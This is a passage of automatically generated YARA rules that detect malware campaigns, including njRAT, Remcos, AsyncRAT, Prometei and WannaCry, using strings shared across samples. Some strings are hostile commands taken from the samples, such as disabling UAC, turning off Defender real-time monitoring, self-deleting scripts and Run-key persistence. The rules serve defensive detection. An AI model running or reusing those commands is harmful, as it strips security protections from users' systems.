        description = "Strings shared by the samples of campaign tlsh-01d19110"
        date = "2026-10-17"
        campaign = "tlsh-01d19110"
        family = "prometei"
        hash = "281d056db87e611ed06da0594da00feae781f51f8833009f486d1d3b4bd0cb9a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-01d19110.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 4.24 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = " rrrr!\"#$rrrr%&'(rrrr)*+,rrrr-./0rrrr1234rrrr5678rrrr9:;<rrrr=>?@rrrrABCDrrrrEFGHrrrrIJKLrrrrMNOQrrr" ascii
        $s3 = " NNNN!#$`NNNNabcdNNNNefghNNNNijklNNNNmnopNNNNqrstNNNNuvwxNNNNyz{|NNNN}~" ascii
        $s4 = " \"$9999%&/59999679:9999<DGH9999I_`a9999bc" ascii
        $s5 = "PROT_EXEC|PROT_WRITE failed." ascii
        $s6 = "rRSTUrrrrVWXYrrrrZ[\\^rrrr_jkrrrrrstu" ascii
        $s7 = "ZabctZhijklmnopqrstuvwx" ascii
        $s8 = "GCC: (Ubuntu 9.3.0-17u" ascii
        $s9 = "o+c6wpXySE3l2z37X3Z" ascii
        $s10 = "hr9f244U7KMUIM5f?]" ascii
        $s11 = "hTbyxwz-bOtEuMN2" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_dd52c19b_njrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-dd52c19b"
        date = "2026-10-17"
        campaign = "tlsh-dd52c19b"
        family = "njrat"
        hash = "165619e61ebf6feb78b2b78f1fa407540e71712e6fe8185bb810c8dffd54eaff"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-dd52c19b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "cmd /c reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DW" wide
        $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s2 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s3 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s4 = "cmd /c rundll32.exe user32.dll,LockWorkStation" wide
        $s5 = "cmd /c powershell Set-MpPreference -DisableRealtimeMonitoring $true" wide
        $s6 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" ascii
        $s7 = "Cannot overwrite MBR, needs Admin privilege" wide
        $s8 = "As you reboot, you find that your MBR has been overwritten." ascii
        $s9 = "AdminCheck: Can't use MBR. (No admin)" wide
        $s10 = "BluetoothNotificationAreaIconWindowClass" wide
        $s11 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_4ee03782_remcosrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4ee03782"
        date = "2026-10-17"
        campaign = "tlsh-4ee03782"
        family = "remcosrat"
        hash = "710482ef543f6dadf62abd92b4216e18aba48cad65829186fc5c6974d0b852c8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4ee03782.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "https://pro.ip-api.com/line/?key=QPVvv1rHQJD2pd2&fields=25948155" wide
        $s1 = "Copyright (c) by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED." ascii
        $s2 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" ascii
        $s3 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" ascii
        $s4 = "CreateObject(\"WScript.Shell\").Run \"cmd /c \"\"" wide
        $s5 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" wide
        $s6 = "CreateObject(\"Scripting.FileSystemObject\").DeleteFile(Wscript.ScriptFullName)" wide
        $s7 = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders" wide
        $s8 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\" wide
        $s9 = "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall" ascii
        $s10 = "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" wide
        $s11 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1502288 and 12 of them
}

rule Sightlines_signer_cert_sha1_10b07153_connectwise
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-10b07153"
        date = "2026-10-17"
        campaign = "signer_cert_sha1-10b07153"
        family = "connectwise"
        hash = "10e851bd7fc8e17b390cb8ccedb4becbe1008ff37e6b327c761b2572f42ea5ab"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-10b07153.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Connectwise, LLC0" ascii
        $s1 = "Connectwise, LLC1" ascii
        $s2 = "250815235959Z0e1" ascii
        $s3 = "351125235959Z0B1" ascii
        $s4 = "220817000000Z" ascii
        $s5 = "240926000000Z" ascii
        $s6 = "Florida1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 14283872 and 7 of them
}

rule Sightlines_imphash_2673644c_connectwise
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-2673644c"
        date = "2026-10-17"
        campaign = "imphash-2673644c"
        family = "connectwise"
        hash = "0122c998f7c99de562fdae27ef486c6653544e89e15963b67d3418fe7f92c73e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-2673644c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " !\"#$%%&'()*+,-../0123456789:;<=>?@ABCDEFGHIJKLLMNOPQRSTUVWXY[]_`bdefhjlnprtvz|~" ascii
        $s1 = "  !\"\"##$%%&&'(())**+,,--.//00122334556677899::;<<==>??@@AABCCDDEFFGGHIIJJKLLMMNNOPPQQRSSTTUVVWWXXYZZ" ascii
        $s2 = "}{ywusqonkigfdb`^\\[YVVSRPMLJIGECB@?=;976431/.,+)(&$#! " wide
        $s3 = " \"#%&()+,.0134679:<>?ABDEGHJKMOPRSUVXY]`cfilorux|" wide
        $s4 = "24?69<>BNPREDHKMY_aTVX[]dftsihlnprvw$&($&(|{" wide
        $s5 = "394821E67B}NOT EXCLUDE_BACKSTAGE_SHELLScreenConnect.WindowsBackstageShell.exeFileManagerFiles{80C42F" ascii
        $s6 = "E1-27A8-4EB1-896F-161D3237D864}NOT EXCLUDE_FILE_MANAGERScreenConnect.WindowsFileManager.exeServiceFi" ascii
        $s7 = "TNetFramework40ClientCustomActionLibraryWixCAMainFiles{E0EF5F66-7B92-40DE-8B20-EB91E1C859BB}INSTALLL" ascii
        $s8 = "OCATIONNOT EXCLUDE_MAINScreenConnect.ClientService.dllBackstageShellFiles{DDCF1E82-0B14-4C68-A063-33" ascii
        $s9 = "[[\\]]^^_``aabccddeefgghhijjkklmmnnoppqqrrsttuuvwwxxyzz{{||}~~" ascii
        $s10 = "lesWithService{7350F8A0-CE89-45E4-99C4-3D3D88E5E884}NOT EXCLUDE_SERVICE AND SERVICE_CLIENT_LAUNCH_PA" ascii
        $s11 = "allFinalizeExecuteActionPublishFeaturesPublishProductNETFRAMEWORK20NetFramework20NETFRAMEWORK40CLIEN" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 41558128 and 6 of them
}

rule Sightlines_rich_header_hash_c094f98c_connectwise
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-c094f98c"
        date = "2026-10-17"
        campaign = "rich_header_hash-c094f98c"
        family = "connectwise"
        hash = "0122c998f7c99de562fdae27ef486c6653544e89e15963b67d3418fe7f92c73e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-c094f98c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " !\"#$%%&'()*+,-../0123456789:;<=>?@ABCDEFGHIJKLLMNOPQRSTUVWXY[]_`bdefhjlnprtvz|~" ascii
        $s1 = "  !\"\"##$%%&&'(())**+,,--.//00122334556677899::;<<==>??@@AABCCDDEFFGGHIIJJKLLMMNNOPPQQRSSTTUVVWWXXYZZ" ascii
        $s2 = "}{ywusqonkigfdb`^\\[YVVSRPMLJIGECB@?=;976431/.,+)(&$#! " wide
        $s3 = " \"#%&()+,.0134679:<>?ABDEGHJKMOPRSUVXY]`cfilorux|" wide
        $s4 = "24?69<>BNPREDHKMY_aTVX[]dftsihlnprvw$&($&(|{" wide
        $s5 = "394821E67B}NOT EXCLUDE_BACKSTAGE_SHELLScreenConnect.WindowsBackstageShell.exeFileManagerFiles{80C42F" ascii
        $s6 = "E1-27A8-4EB1-896F-161D3237D864}NOT EXCLUDE_FILE_MANAGERScreenConnect.WindowsFileManager.exeServiceFi" ascii
        $s7 = "TNetFramework40ClientCustomActionLibraryWixCAMainFiles{E0EF5F66-7B92-40DE-8B20-EB91E1C859BB}INSTALLL" ascii
        $s8 = "OCATIONNOT EXCLUDE_MAINScreenConnect.ClientService.dllBackstageShellFiles{DDCF1E82-0B14-4C68-A063-33" ascii
        $s9 = "[[\\]]^^_``aabccddeefgghhijjkklmmnnoppqqrrsttuuvwwxxyzz{{||}~~" ascii
        $s10 = "lesWithService{7350F8A0-CE89-45E4-99C4-3D3D88E5E884}NOT EXCLUDE_SERVICE AND SERVICE_CLIENT_LAUNCH_PA" ascii
        $s11 = "allFinalizeExecuteActionPublishFeaturesPublishProductNETFRAMEWORK20NetFramework20NETFRAMEWORK40CLIEN" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 41558128 and 6 of them
}

rule Sightlines_imphash_9071c961_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-9071c961"
        date = "2026-10-17"
        campaign = "imphash-9071c961"
        family = ""
        hash = "172cb9ab2e82ead2757946af852df3e8569cb0ce4dbc9229f7b7e38cedaed11f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-9071c961.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/> " ascii
        $s1 = "      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/> " ascii
        $s2 = "      <!--The ID below indicates application support for Windows 8.1 -->" ascii
        $s3 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s4 = "      <!--The ID below indicates application support for Windows 10 -->" ascii
        $s5 = "      <!--The ID below indicates application support for Windows 7 -->" ascii
        $s6 = "      <!--The ID below indicates application support for Windows 8 -->" ascii
        $s7 = "      <!--The ID below indicates application support for Windows Vista -->" ascii
        $s8 = "        <requestedExecutionLevel level=\"asInvoker\"/>" ascii
        $s9 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s10 = "Partial loss of significance (PLOSS)" ascii
        $s11 = "Total loss of significance (TLOSS)" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_f2ee45ab_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f2ee45ab"
        date = "2026-10-17"
        campaign = "tlsh-f2ee45ab"
        family = ""
        hash = "172cb9ab2e82ead2757946af852df3e8569cb0ce4dbc9229f7b7e38cedaed11f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f2ee45ab.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/> " ascii
        $s1 = "      <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/> " ascii
        $s2 = "      <!--The ID below indicates application support for Windows 8.1 -->" ascii
        $s3 = "The result is too small to be represented (UNDERFLOW)" ascii
        $s4 = "      <!--The ID below indicates application support for Windows 10 -->" ascii
        $s5 = "      <!--The ID below indicates application support for Windows 7 -->" ascii
        $s6 = "      <!--The ID below indicates application support for Windows 8 -->" ascii
        $s7 = "      <!--The ID below indicates application support for Windows Vista -->" ascii
        $s8 = "        <requestedExecutionLevel level=\"asInvoker\"/>" ascii
        $s9 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s10 = "Partial loss of significance (PLOSS)" ascii
        $s11 = "Total loss of significance (TLOSS)" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_0de6deff_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-0de6deff"
        date = "2026-10-17"
        campaign = "tlsh-0de6deff"
        family = ""
        hash = "10e7a7e50171e1a71d79a2e4052cce145c09c26ed9213dd940df68261c3b5f16"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-0de6deff.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "d,Q:0x9b},B=a0I;return/headless|bytespider/i[B(a0c.d)](a0p[B(a0c.Q)]);},'appVersionCheck':function()" ascii
        $s1 = "{d:0xc6},t=a0I;return t(a0a.d)in window||!!a0p[t(0xc6)];},'userAgentCheck':function(){var a0c={d:0x9" ascii
        $s2 = "{var a0e={d:0x9d},T=a0I;return/headless/i[T(a0e.d)](a0p['appVersion']);},'pluginArraySpoofing':funct" ascii
        $s3 = "ion(){var a0S={d:0x96,Q:0xb0,m:0xb0,v:0xb7},k=a0I;let d=PluginArray[k(a0S.d)]===a0p[k(a0S.Q)]['__pro" ascii
        $s4 = "Int(U(a0y.o))/0xc)+parseInt(U(0x93))/0xd;if(v===Q)break;else m['push'](m['shift']());}catch(p){m['pu" ascii
        $s5 = "proto__'];return!d;},'noLanguage':function(){var a0g={d:0x98},J=a0I;return!a0p[J(0x92)]||a0p[J(0xa1)" ascii
        $s6 = "sh'](m['shift']());}}}(a0m,0xb1385));function a0v(d,Q){var m=a0m();return a0v=function(v,p){v=v-0x92" ascii
        $s7 = "outerWidth']===0x0;}},a0w=function(m,v){var a0z={d:0xbe,Q:0xab,m:0xb6},C=a0I,p=(function(){var w=!![" ascii
        $s8 = "mimeTypeArraySpoofing':function(){var a0n={d:0xa2},Y=a0I;let d=MimeTypeArray['prototype']===a0p[Y(a0" ascii
        $s9 = "=d();while(!![]){try{var v=parseInt(U(0xc5))/0x1*(-parseInt(U(0xbc))/0x2)+parseInt(U(a0y.d))/0x3*(-p" ascii
        $s10 = "][J(a0g.d)]===0x0;},'zeroOuterDimensions':function(){return window['outerHeigh'+'t']===0x0&&window['" ascii
        $s11 = ";var r=m[v];return r;},a0v(d,Q);}var a0p=window[a0I(0xc8)],a0r={'webdriverCheck':function(){var a0a=" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_33f11a26_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-33f11a26"
        date = "2026-10-17"
        campaign = "tlsh-33f11a26"
        family = ""
        hash = "652e96e19570f8eea3b36114c053ffd88fa708b03f309d1477659c13c014e279"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-33f11a26.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " inflate 1.2.8 Copyright 1995-2013 Mark Adler " ascii
        $s1 = "Failed to convert pyhome to ANSI (invalid multibyte string)" ascii
        $s2 = "Failed to get address for PyMarshal_ReadObjectFromString" ascii
        $s3 = "Failed to convert pypath to ANSI (invalid multibyte string)" ascii
        $s4 = "PyInstaller: pyi_win32_utils_to_utf8 failed." ascii
        $s5 = "WARNING: file already exists but should not: %s" ascii
        $s6 = "Cannot allocate memory for ARCHIVE_STATUS" ascii
        $s7 = "Failed to convert Wflag %s using mbstowcs (invalid multibyte string)" ascii
        $s8 = "Failed to get address for PyObject_CallFunction" ascii
        $s9 = "Failed to get address for Py_FileSystemDefaultEncoding" ascii
        $s10 = "Failed to get address for PyImport_ExecCodeModule" ascii
        $s11 = "Failed to get address for PyRun_SimpleString" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 6241542 and 12 of them
}

rule Sightlines_tlsh_db8e3c99_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-db8e3c99"
        date = "2026-10-17"
        campaign = "tlsh-db8e3c99"
        family = ""
        hash = "14d2db3fea41a3ac7281a32cf4c2870bca4e11c4412c6ed7aa00a4bd51756a42"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-db8e3c99.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " inflate 1.2.8 Copyright 1995-2013 Mark Adler " ascii
        $s1 = "Failed to convert pyhome to ANSI (invalid multibyte string)" ascii
        $s2 = "Failed to get address for PyMarshal_ReadObjectFromString" ascii
        $s3 = "Failed to convert pypath to ANSI (invalid multibyte string)" ascii
        $s4 = "PyInstaller: pyi_win32_utils_to_utf8 failed." ascii
        $s5 = "WARNING: file already exists but should not: %s" ascii
        $s6 = "Cannot allocate memory for ARCHIVE_STATUS" ascii
        $s7 = "Failed to convert Wflag %s using mbstowcs (invalid multibyte string)" ascii
        $s8 = "Failed to get address for PyObject_CallFunction" ascii
        $s9 = "Failed to get address for Py_FileSystemDefaultEncoding" ascii
        $s10 = "Failed to get address for PyImport_ExecCodeModule" ascii
        $s11 = "Failed to get address for PyRun_SimpleString" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1310560 and 12 of them
}

rule Sightlines_tlsh_6a6c4c45_asyncrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6a6c4c45"
        date = "2026-10-17"
        campaign = "tlsh-6a6c4c45"
        family = "asyncrat"
        hash = "0b19b12b0919cf3bb6904355593948a5077f23f81aca05ffebf60f81eb860ea2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6a6c4c45.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ").NETFramework,Version=v4.0,Profile=Client" ascii
        $s1 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s2 = "Invalid message authentication code (MAC)." wide
        $s3 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" />" ascii
        $s4 = "\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS" wide
        $s5 = "Select * from Win32_ComputerSystem" wide
        $s6 = "masterKey can not be null or empty." wide
        $s7 = "(ext8,ext16,ex32) type $c7,$c8,$c9" wide
        $s8 = ".NET Framework 4 Client Profile" ascii
        $s9 = "Select * from AntivirusProduct" wide
        $s10 = "<IsConnected>k__BackingField" ascii
        $s11 = "<HeaderSize>k__BackingField" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 10 of them
}

rule Sightlines_rich_header_hash_6af59d76_remcosrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-6af59d76"
        date = "2026-10-17"
        campaign = "rich_header_hash-6af59d76"
        family = "remcosrat"
        hash = "342c8cbca7f6c97acbd974963ad9909b9864cf0643244f4565593d8b67b893f1"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-6af59d76.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "https://pro.ip-api.com/line/?key=QPVvv1rHQJD2pd2&fields=25948155" wide
        $s1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" ascii
        $s2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" ascii
        $s3 = "CreateObject(\"WScript.Shell\").Run \"cmd /c \"\"" wide
        $s4 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" wide
        $s5 = "CreateObject(\"Scripting.FileSystemObject\").DeleteFile(Wscript.ScriptFullName)" wide
        $s6 = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders" wide
        $s7 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\" wide
        $s8 = "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall" ascii
        $s9 = "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" wide
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" wide
        $s11 = "C6858E06B70404E9CD9E3ECB662395B4429C648139053FB521F828AF606B4D3DBAA14B5E77EFE75928FE1DC127A2FFA8DE33" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1502288 and 12 of them
}

rule Sightlines_imphash_4f993e69_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-4f993e69"
        date = "2026-10-17"
        campaign = "imphash-4f993e69"
        family = ""
        hash = "2ce6a4a50f9862f7338d077f9cefd90a02997c28add53588ad0e43c74bf750a7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-4f993e69.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "6d0da78}\"/><supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/></application></compatibility><" ascii
        $s1 = "ortedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/><supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f" ascii
        $s2 = "_ZTVNSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_stri" ascii
        $s3 = "*NSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_stringI" ascii
        $s4 = "_ZNSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_string" ascii
        $s5 = "_ZTINSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_stri" ascii
        $s6 = "_ZTSNSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_stri" ascii
        $s7 = "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\"><application><supportedOS Id=\"{e20" ascii
        $s8 = "11457-1546-43c5-a5fe-008deee3d3f0}\"/><supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/><supp" ascii
        $s9 = ".pdata$_ZNK12_GLOBAL__N_121system_error_category10equivalentEiRKSt15error_condition" ascii
        $s10 = ".xdata$_ZNK12_GLOBAL__N_121system_error_category10equivalentEiRKSt15error_condition" ascii
        $s11 = ".pdata.unlikely._ZNSt12_GLOBAL__N_1L14__throw_syserrEiPKc" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 7660322 and 12 of them
}

rule Sightlines_tlsh_213c09cf_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-213c09cf"
        date = "2026-10-17"
        campaign = "tlsh-213c09cf"
        family = ""
        hash = "2ce6a4a50f9862f7338d077f9cefd90a02997c28add53588ad0e43c74bf750a7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-213c09cf.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "6d0da78}\"/><supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/></application></compatibility><" ascii
        $s1 = "ortedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/><supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f" ascii
        $s2 = "_ZTVNSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_stri" ascii
        $s3 = "*NSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_stringI" ascii
        $s4 = "_ZNSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_string" ascii
        $s5 = "_ZTINSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_stri" ascii
        $s6 = "_ZTSNSt6thread11_State_implINS_8_InvokerISt5tupleIJZN7orchard11ripen_asyncERKNSt7__cxx1112basic_stri" ascii
        $s7 = "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\"><application><supportedOS Id=\"{e20" ascii
        $s8 = "11457-1546-43c5-a5fe-008deee3d3f0}\"/><supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/><supp" ascii
        $s9 = ".pdata$_ZNK12_GLOBAL__N_121system_error_category10equivalentEiRKSt15error_condition" ascii
        $s10 = ".xdata$_ZNK12_GLOBAL__N_121system_error_category10equivalentEiRKSt15error_condition" ascii
        $s11 = ".pdata.unlikely._ZNSt12_GLOBAL__N_1L14__throw_syserrEiPKc" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 7660322 and 12 of them
}

rule Sightlines_tlsh_4e2a2ff6_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4e2a2ff6"
        date = "2026-10-17"
        campaign = "tlsh-4e2a2ff6"
        family = ""
        hash = "30a27eaf23cbec3ad0817f339ac43655aed23c96d047d0791d5d8a5db1fba2a5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4e2a2ff6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        'W47dN09jW4nAhSkkBvLJzCoAlu9lW5dcQ3KhjWNcL1nvWRjuW5H7nZddVCoPW6rlvCkWWQG'," ascii
        $s1 = "        'yCo6W6LbW73dUbBcPSkHWQNdTCo7W5VcVcZcHLBcLSk6W6NdRNddS8kYW5ZdKwXokCoIWQjgW4uLr1TRW5O'," ascii
        $s2 = "_0x14d7c0] = _0x38d82e, _0x3821ba += String['fromCharCode'](_0x1daf17['charCodeAt'](_0x3479ca) ^ _0x" ascii
        $s3 = "        'wdFdP27cO0RcL8oLiSo7n2b0BmkkzCk0W5KNW5ldR8k1W7/cTfvy'," ascii
        $s4 = "0x1140ba, _0x242679++ % 0x4) ? _0x238764 += String['fromCharCode'](0xff & _0x11774c >> (-0x2 * _0x24" ascii
        $s5 = "XObject(_0x1714ab(0x25)), _0x377284 = new ActiveXObject(_0x522091(0x27));" ascii
        $s6 = "        'qSo2W6XnW7/dVXFcRCkQW6VcNCo3W4/cVf/dKKVcJCkVWQtcJhFdQCo3W53dNa'," ascii
        $s7 = "h[_0x1484f9(0x50, 'mY!u')]()['toString'](0x24)[_0x1af0aa(0x23)](0x2, 0xa)[_0x37da08(0x1d)]();" ascii
        $s8 = "    _0xbe362c[_0x59725f(0x7, 'KsBQ')](), this[_0x522091(0x13)] = _0xbe362c;" ascii
        $s9 = "_0x5bb3e4 = _0x2f60['tEkoJG'](_0x5bb3e4, _0x2f6070), _0x2f60['LwDoBx'][_0x1aa0d4] = _0x5bb3e4) : _0x" ascii
        $s10 = "    var _0x3e91be = _0x4de8a3, _0x136d28 = new ActiveXObject(_0x522091(0x4)), _0x20cea2 = new Active" ascii
        $s11 = "function _0x5d5e(_0x180d4f, _0x38978a) {" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_81dbdf66_wannacry
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-81dbdf66"
        date = "2026-10-17"
        campaign = "imphash-81dbdf66"
        family = "wannacry"
        hash = "78e25638e490f326551d803a608c0df0f7e5af2747f124078237301737f63b2b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-81dbdf66.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "C4OSmdKQrtN4zZnAShPGa3yLpqS3VvaD+W5IRkA9dhgJi1NlYPDhKQB2pr7GgprbLruE8xtGkqWGFtDoqzIXeXU3XV6NOsK7TlcH" ascii
        $s1 = "5DFOtJPRVbIPl8QOjm2IE1rwQt4AbVR2o6YK5pUGXNLCZxXroI8l+mQX3gudA56Bcb/I7hfyeWZy5zaWa5BRrI1Ss+7D3v9knvDj" ascii
        $s2 = "vLg7Z1Yr/AZ9TmVxAspk7OakT4SmzfidGCQHPD6qoQ41LMIIyKFqGsWQuDEw4x/9j8jbUm+8ebrYp2a8XGY1h3pcYKAJ7f3a9sPB" ascii
        $s3 = "hiYO7Q+UFFfP/bcJ4FTPy5qnpEnX6v+n88x+C1TSRKCzHZ9osGZF3WtNaDyBIirDNBcOtpV0TcMLaoZiSGg7YW1BrYdfwMKBsYuK" ascii
        $s4 = "7gHFD958N9Ikb/zj66YdRI/SIUt3c+fEPxFLLmSmOGQ8Rbpl1ytuv02fEoG4PhU8kVJ5BUKldbtJG23VlkEmWTKy+q2y1/e7injM" ascii
        $s5 = "H7HLnklZH1DscvSX0oEzLb9ao0qjflfyRGeFEnFbJrG/m/FawTW35AVy4Dzyj+eJQPeQjNUDpmYCF7lQg8Ogvik53rxqvui98Dhv" ascii
        $s6 = "7cnWqoHGHRhLihPuuXPs2N/CNUMOSGRjVyfio3Du9RtCB7FcJDdvvFHa343mSJsMQpYYNa+Tr+egbyulIVECrZUydjVmaPzw2sWi" ascii
